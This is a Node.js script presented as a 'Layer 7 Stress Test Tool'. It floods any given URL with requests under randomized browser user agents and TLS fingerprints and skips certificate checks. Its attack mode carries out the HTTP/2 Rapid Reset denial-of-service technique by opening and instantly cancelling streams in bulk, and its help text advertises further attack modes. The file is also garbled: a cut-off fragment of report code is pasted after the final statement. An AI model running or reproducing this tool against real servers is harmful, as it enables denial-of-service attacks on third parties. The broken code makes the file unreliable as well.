/**
 * Advanced Layer 7 Stress Test Tool
 * Features: Async Pool, Circuit Breaker, Auto Reconnect, Protocol Failover
 * Optimized for server environments with efficient logging
 */

const { Client } = require('undici');
const http2 = require('http2');
const { URL } = require('url');
const readline = require('readline');

const C = {
    reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m",
    red: "\x1b[31m", green: "\x1b[32m", yellow: "\x1b[33m",
    blue: "\x1b[34m", magenta: "\x1b[35m", cyan: "\x1b[36m",
    gray: "\x1b[90m", white: "\x1b[97m",
    bgRed: "\x1b[41m", bgGreen: "\x1b[42m"
};


const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36"
];

const TLS_PROFILES = [
    {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
        ecdhCurve: "X25519:P-256:P-384"
    },
    {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256",
        ecdhCurve: "X25519:P-256:P-384:P-521"
    }
];

const HTTP_METHODS = ["GET", "HEAD", "POST", "PUT", "OPTIONS"];

const rand = (arr) => arr[Math.floor(Math.random() * arr.length)];
const getTls = () => rand(TLS_PROFILES);
const formatTime = (sec) => {
    const h = Math.floor(sec / 3600);
    const m = Math.floor((sec % 3600) / 60);
    const s = Math.floor(sec % 60);
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
};


class CircuitBreaker {
    constructor(threshold = 10, timeout = 5000, halfOpenRequests = 3) {
        this.failCount = 0;
        this.successCount = 0;
        this.threshold = threshold;
        this.timeout = timeout;
        this.halfOpenRequests = halfOpenRequests;
        this.state = "CLOSED";
        this.nextAttempt = 0;
    }

    async execute(fn) {
        if (this.state === "OPEN") {
            if (Date.now() < this.nextAttempt) {
                throw new Error("Circuit OPEN - Waiting for reconnect");
            }
            this.state = "HALF_OPEN";
            this.successCount = 0;
        }

        try {
            const result = await fn();
            
            if (this.state === "HALF_OPEN") {
                this.successCount++;
                if (this.successCount >= this.halfOpenRequests) {
                    this.reset();
                }
            } else {
                this.failCount = Math.max(0, this.failCount - 1);
            }
            
            return result;
        } catch (err) {
            this.failCount++;
            
            if (this.state === "HALF_OPEN") {
                this.state = "OPEN";
                this.nextAttempt = Date.now() + this.timeout;
            } else if (this.failCount >= this.threshold) {
                this.state = "OPEN";
                this.nextAttempt = Date.now() + this.timeout;
            }
            
            throw err;
        }
    }

    reset() {
        this.failCount = 0;
        this.successCount = 0;
        this.state = "CLOSED";
    }

    getState() {
        return this.state;
    }
}

async function asyncPool(poolLimit, array, iteratorFn) {
    const ret = [];
    const executing = [];
    
    for (const item of array) {
        const p = Promise.resolve().then(() => iteratorFn(item, array));
        ret.push(p);
        
        if (poolLimit <= array.length) {
            const e = p.then(() => executing.splice(executing.indexOf(e), 1));
            executing.push(e);
            if (executing.length >= poolLimit) {
                await Promise.race(executing);
            }
        }
    }
    
    return Promise.all(ret);
}

async function detectProtocols(url) {
    const protocols = new Set();
    
    try {
        const client = new Client(url, {
            connect: { 
                rejectUnauthorized: false, 
                ...getTls(),
                ALPNProtocols: ["h2", "http/1.1"]
            }
        });
        
        const { headers } = await client.request({
            path: "/",
            method: "HEAD",
            signal: AbortSignal.timeout(3000)
        });
        
        if (headers['alt-svc']?.includes('h3')) protocols.add('h3');
        protocols.add('h2');
        protocols.add('h1.1');
        
        await client.close();
    } catch (err) {
        protocols.add('h1.1');
    }
    
    return Array.from(protocols);
}

async function sendRequest(url, path, breaker, stats, protocols) {
    for (const proto of protocols) {
        try {
            return await breaker.execute(async () => {
                let client;
                
                if (proto === 'h2') {
                    client = new Client(url, {
                        connect: { rejectUnauthorized: false, ...getTls() }
                    });
                } else if (proto === 'h3') {
                    client = new Client(url, {
                        connect: { rejectUnauthorized: false, ...getTls() }
                    });
                } else {
                    client = new Client(url, {
                        connect: { rejectUnauthorized: false, ...getTls() },
                        pipelining: 1
                    });
                }

                const start = process.hrtime.bigint();
                const { statusCode, body } = await client.request({
                    path,
                    method: rand(HTTP_METHODS),
                    headers: { 
                        "User-Agent": rand(USER_AGENTS),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Connection": "keep-alive"
                    },
                    signal: AbortSignal.timeout(8000)
                });

                for await (const _ of body) {}
                await client.close();

                const end = process.hrtime.bigint();
                const latency = Number(end - start) / 1e6;

                stats.success++;
                stats.totalLatency += latency;
                stats.statusCodes[statusCode] = (stats.statusCodes[statusCode] || 0) + 1;
                stats.protocols[proto] = (stats.protocols[proto] || 0) + 1;
                
                if (latency < stats.minLatency) stats.minLatency = latency;
                if (latency > stats.maxLatency) stats.maxLatency = latency;

                return { statusCode, latency, proto };
            });
        } catch (err) {
            if (proto === protocols[protocols.length - 1]) {
                stats.failed++;
                stats.errors[err.code || err.message?.substring(0, 20) || "UNKNOWN"] = 
                    (stats.errors[err.code || err.message?.substring(0, 20) || "UNKNOWN"] || 0) + 1;
                throw err;
            }
        }
    }
}


async function rapidResetAttack(url, stats, duration) {
    const startTime = Date.now();
    
    while (Date.now() - startTime < duration) {
        let client;
        try {
            client = http2.connect(url, {
                rejectUnauthorized: false,
                ...getTls()
            });

            await new Promise((resolve, reject) => {
                client.once('connect', resolve);
                client.once('error', reject);
                setTimeout(() => reject(new Error('Connect timeout')), 5000);
            });

            for (let i = 0; i < 50; i++) {
                const stream = client.request({
                    ':method': 'GET',
                    ':path': '/',
                    ':scheme': 'https',
                    ':authority': new URL(url).host
                });
                
                stats.attackSent++;
                
                stream.on('response', (headers) => {
                    stats.attackReceived++;
                    stats.attackStatus[headers[':status']] = 
                        (stats.attackStatus[headers[':status']] || 0) + 1;
                });
                
                stream.on('error', () => stats.attackErrors++);
                
                setImmediate(() => {
                    if (!stream.destroyed) {
                        stream.close(http2.constants.NGHTTP2_CANCEL);
                    }
                });
            }

            await new Promise(resolve => setTimeout(resolve, 100));
            
        } catch (err) {
            stats.attackErrors++;
        } finally {
            if (client && !client.destroyed) {
                client.destroy();
            }
        }
    }
}

function displayStats(stats, startTime, remaining, breaker, protocols) {
    const elapsed = (Date.now() - startTime) / 1000;
    const total = stats.success + stats.failed;
    const rps = (stats.success / elapsed).toFixed(1);
    const avgLatency = stats.success > 0 ? (stats.totalLatency / stats.success).toFixed(0) : 0;
    const successRate = total > 0 ? ((stats.success / total) * 100).toFixed(1) : 0;
    
    const circuitState = breaker.getState();
    const stateColor = circuitState === "CLOSED" ? C.green : 
                       circuitState === "HALF_OPEN" ? C.yellow : C.red;
    
    const line = `${C.cyan}[${formatTime(elapsed)}]${C.reset} ` +
                 `${C.gray}Remaining: ${formatTime(remaining)}${C.reset} | ` +
                 `${C.green}✓${stats.success}${C.reset} ` +
                 `${C.red}✗${stats.failed}${C.reset} ` +
                 `${C.blue}${avgLatency}ms${C.reset} ` +
                 `${C.yellow}${rps}req/s${C.reset} ` +
                 `${C.magenta}${successRate}%${C.reset} | ` +
                 `Circuit: ${stateColor}${circuitState}${C.reset} | ` +
                 `Protocols: ${C.cyan}${protocols.join(',')}${C.reset}`;
    
    readline.clearLine(process.stdout, 0);
    readline.cursorTo(process.stdout, 0);
    process.stdout.write(line);
}

function printReport(stats, elapsed, url, protocols, attackMode) {
    console.log("\n\n" + C.cyan + "=".repeat(60) + C.reset);
    console.log(C.bold + C.green + "       ⚡️ TEST COMPLETED ⚡️       " + C.reset);
    console.log(C.cyan + "=".repeat(60) + C.reset + "\n");
    
    console.log(`${C.white}Target:${C.reset} ${url}`);
    console.log(`${C.white}Duration:${C.reset} ${elapsed.toFixed(2)}s`);
    console.log(`${C.white}Protocols Detected:${C.reset} ${protocols.join(", ")}`);
    if (attackMode !== 'none') {
        console.log("\n" + C.bold + "Attack Statistics:" + C.reset);
        console.log(`  ${C.magenta}Attack Streams Sent:${C.reset} ${stats.attackSent}`);
        console.log(`  ${C.magenta}Attack Responses:${C.reset} ${stats.attackReceived}`);
        console.log(`  ${C.red}Attack Errors:${C.reset} ${stats.attackErrors}`);
    }
    
    console.log("\n" + C.bold + "Top Status Codes:" + C.reset);
    const topCodes = Object.entries(stats.statusCodes)
        .sort(([, a], [, b]) => b - a)
        .slice(0, 10);
    
    topCodes.forEach(([code, count]) => {
        const color = code.startsWith('2') ? C.green : 
                     code.startsWith('3') ? C.yellow : 
                     code.startsWith('4') ? C.magenta : C.red;
        console.log(`  ${color}${code}${C.reset}: ${count}`);
    });
    
    if (attackMode !== 'none' && Object.keys(stats.attackStatus).length > 0) {
        console.log("\n" + C.bold + "Attack Response Codes:" + C.reset);
        Object.entries(stats.attackStatus)
            .sort(([, a], [, b]) => b - a)
            .slice(0, 5)
            .forEach(([code, count]) => {
                console.log(`  ${C.yellow}${code}${C.reset}: ${count}`);
            });
    }
    
    console.log("\n" + C.bold + "Protocol Distribution:" + C.reset);
    Object.entries(stats.protocols).forEach(([proto, count]) => {
        const percentage = ((count / stats.success) * 100).toFixed(1);
        console.log(`  ${C.cyan}${proto.toUpperCase()}${C.reset}: ${count} (${percentage}%)`);
    });
    
    if (Object.keys(stats.errors).length > 0) {
        console.log("\n" + C.bold + "Top Errors:" + C.reset);
        Object.entries(stats.errors)
            .sort(([, a], [, b]) => b - a)
            .slice(0, 5)
            .forEach(([error, count]) => {
                console.log(`  ${C.red}${error}${C.reset}: ${count}`);
            });
    }
    
    console.log("\n" + C.cyan + "=".repeat(60) + C.reset + "\n");
}

function parseArgs() {
    const args = process.argv.slice(2);
    const config = {
        url: null,
        time: 1,
        conc: 50,
        attack: 'none',
        protocol: null,
        adaptiveDelay: false
    };
    
    for (let i = 0; i < args.length; i++) {
        switch (args[i]) {
            case '-u':
            case '--url':
                config.url = args[++i];
                break;
            case '-t':
            case '--time':
                config.time = parseInt(args[++i], 10);
                break;
            case '-c':
            case '--conc':
                config.conc = parseInt(args[++i], 10);
                break;
            case '-a':
            case '--attack':
                config.attack = args[++i];
                break;
            case '-p':
            case '--protocol':
                config.protocol = args[++i];
                break;
            case '--adaptive-delay':
                config.adaptiveDelay = true;
                break;
            case '-h':
            case '--help':
                showHelp();
                process.exit(0);
        }
    }
    
    if (!config.url) {
        console.error(`${C.red}Error: URL is required${C.reset}`);
        showHelp();
        process.exit(1);
    }
    
    return config;
}

function showHelp() {
    console.log(`
${C.bold}${C.cyan}Advanced Layer 7 Stress Test Tool${C.reset}

${C.bold}Usage:${C.reset}
  node stress-test.js -u <url> [options]

${C.bold}Options:${C.reset}
  ${C.green}-u, --url <url>${C.reset}           Target URL (required)
  ${C.green}-t, --time <minutes>${C.reset}      Test duration in minutes (default: 1)
  ${C.green}-c, --conc <number>${C.reset}       Concurrency/threads (default: 50)
  ${C.green}-a, --attack <mode>${C.reset}       Attack mode: none, rapid-reset, madeyoureset (default: none)
  ${C.green}-p, --protocol <list>${C.reset}     Force protocols: 1.1,2,3 (default: auto-detect)
  ${C.green}--adaptive-delay${C.reset}          Enable adaptive delay on blocking status codes
  ${C.green}-h, --help${C.reset}                Show this help message

${C.bold}Examples:${C.reset}
  ${C.gray}# Basic stress test${C.reset}
  node stress-test.js -u https://example.com -t 2 -c 100

  ${C.gray}# HTTP/2 Rapid Reset attack${C.reset}
  node stress-test.js -u https://example.com -t 1 -a rapid-reset

  ${C.gray}# Force HTTP/1.1 and HTTP/2 only${C.reset}
  node stress-test.js -u https://example.com -p 1.1,2 -c 50

  ${C.gray}# With adaptive delay (rate limit handling)${C.reset}
  node stress-test.js -u https://example.com --adaptive-delay
`);
}

async function main() {
    const config = parseArgs();
    
    console.log(`${C.bold}${C.cyan}⚡️ Advanced Layer 7 Stress Test Tool ⚡️${C.reset}\n`);
    console.log(`${C.white}Target:${C.reset} ${config.url}`);
    console.log(`${C.white}Duration:${C.reset} ${config.time} minute(s)`);
    console.log(`${C.white}Concurrency:${C.reset} ${config.conc}`);
    console.log(`${C.white}Attack Mode:${C.reset} ${config.attack}\n`);
    
    const parsedUrl = new URL(config.url);
    const target = {
        protocol: parsedUrl.protocol,
        host: parsedUrl.hostname,
        path: parsedUrl.pathname + parsedUrl.search,
        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
    };
    const targetUrl = `${target.protocol}//${target.host}:${target.port}`;
    
    // Protocol detection
    console.log(`${C.gray}Detecting protocols...${C.reset}`);
    let protocols;
    
    if (config.protocol) {
        const protocolMap = { '1.1': 'h1.1', '2': 'h2', '3': 'h3' };
        protocols = config.protocol.split(',').map(p => protocolMap[p.trim()]).filter(Boolean);
        console.log(`${C.cyan}Forced protocols: ${protocols.join(", ")}${C.reset}\n`);
    } else {
        protocols = await detectProtocols(targetUrl);
        console.log(`${C.green}Detected protocols: ${protocols.join(", ")}${C.reset}\n`);
    }
    
    if (protocols.length === 0) {
        protocols = ['h1.1'];
    }
    
    // Statistics
    const stats = {
        success: 0,
        failed: 0,
        totalLatency: 0,
        minLatency: Infinity,
        maxLatency: 0,
        statusCodes: {},
        protocols: {},
        errors: {},
        attackSent: 0,
        attackReceived: 0,
        attackErrors: 0,
        attackStatus: {}
    };
    
    const breaker = new CircuitBreaker(15, 8000, 5);
    const startTime = Date.now();
    const durationMs = config.time * 60 * 1000;
    let isRunning = true;
    
    // Handle graceful shutdown
    process.on('SIGINT', () => {
        console.log(`\n\n${C.yellow}Stopping test...${C.reset}`);
        isRunning = false;
    });
    
    // Stats update interval
    const statsInterval = setInterval(() => {
        if (!isRunning) {
            clearInterval(statsInterval);
            return;
        }
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = Math.max(0, (durationMs / 1000) - elapsed);
        displayStats(stats, startTime, remaining, breaker, protocols);
    }, 500);
    
    // Main test logic
    if (config.attack === 'none') {
        // Standard load test with async pool
        const workerTasks = [];
        
        const runWorker = async (workerId) => {
            while (isRunning && Date.now() - startTime < durationMs) {
                try {
                    await sendRequest(targetUrl, target.path, breaker, stats, protocols);
                    
                    // Adaptive delay if enabled
                    if (config.adaptiveDelay && breaker.getState() === "OPEN") {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    
                    // Small delay to prevent CPU overload
                    await new Promise(resolve => setImmediate(resolve));
                    
                } catch (err) {
                    // Error already tracked in stats
                    if (breaker.getState() === "OPEN") {
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                }
            }
        };
        
        // Create worker pool
        for (let i = 0; i < config.conc; i++) {
            workerTasks.push(runWorker(i));
        }
        
        await Promise.race([
            Promise.all(workerTasks),
            new Promise(resolve => setTimeout(resolve, durationMs))
        ]);
        
    } else {
        // Attack mode
        const attackTasks = [];
        
        for (let i = 0; i < config.conc; i++) {
            attackTasks.push(rapidResetAttack(targetUrl, stats, durationMs));
        }
        
        await Promise.race([
            Promise.all(attackTasks),
            new Promise(resolve => setTimeout(resolve, durationMs))
        ]);
    }
    
    isRunning = false;
    clearInterval(statsInterval);
    
    // Final report
    const elapsed = (Date.now() - startTime) / 1000;
    printReport(stats, elapsed, config.url, protocols, config.attack);
}

main().catch(err => {
    console.error(`${C.red}${C.bold}Fatal Error:${C.reset}`, err.message);
    process.exit(1);
});log(`${C.bgRed}${C.white} Attack Mode: ${attackMode.toUpperCase()} ${C.reset}`);
    }
    
    console.log("\n" + C.bold + "Performance Metrics:" + C.reset);
    console.log(`  ${C.green}Successful Requests:${C.reset} ${stats.success}`);
    console.log(`  ${C.red}Failed Requests:${C.reset} ${stats.failed}`);
    console.log(`  ${C.yellow}Requests/Second:${C.reset} ${(stats.success / elapsed).toFixed(2)}`);
    console.log(`  ${C.blue}Avg Latency:${C.reset} ${(stats.totalLatency / stats.success || 0).toFixed(2)}ms`);
    console.log(`  ${C.blue}Min Latency:${C.reset} ${stats.minLatency.toFixed(2)}ms`);
    console.log(`  ${C.blue}Max Latency:${C.reset} ${stats.maxLatency.toFixed(2)}ms`);
    console.log(`  ${C.magenta}Success Rate:${C.reset} ${((stats.success / (stats.success + stats.failed)) * 100 || 0).toFixed(2)}%`);
    
    if (attackMode !== 'none') {
        console.
